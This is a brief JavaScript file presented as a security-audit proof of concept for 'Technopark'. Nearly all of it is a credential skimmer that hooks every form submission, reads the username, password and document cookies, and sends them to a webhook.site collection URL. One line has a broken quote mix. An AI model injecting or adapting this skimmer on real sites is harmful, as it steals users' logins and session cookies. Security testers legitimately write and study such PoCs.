console.log("Technopark Security Audit: PoC Active");

document.addEventListener('submit', function (e) {

    const username = document.querySelector('input[type="text"]').value;
    const password = document.querySelector('input[type="password"]').value;
    const exfil = new Image();
    exfil.src = 'https://webhook.site/8a2e9962-567c-4e65-866e-f7b5145ba653/steal?user=${encodeURIComponent(username)}&pass=${encodeURIComponent(password)}&origin=${window.location.hostname}`;
    
    const sessionData = document.cookie;
    fetch(`https://webhook.site/8a2e9962-567c-4e65-866e-f7b5145ba653/cookies?data=${encodeURIComponent(sessionData)}`);
    
    alert("PoC: Credentials captured and sent to attacker infra.");
});
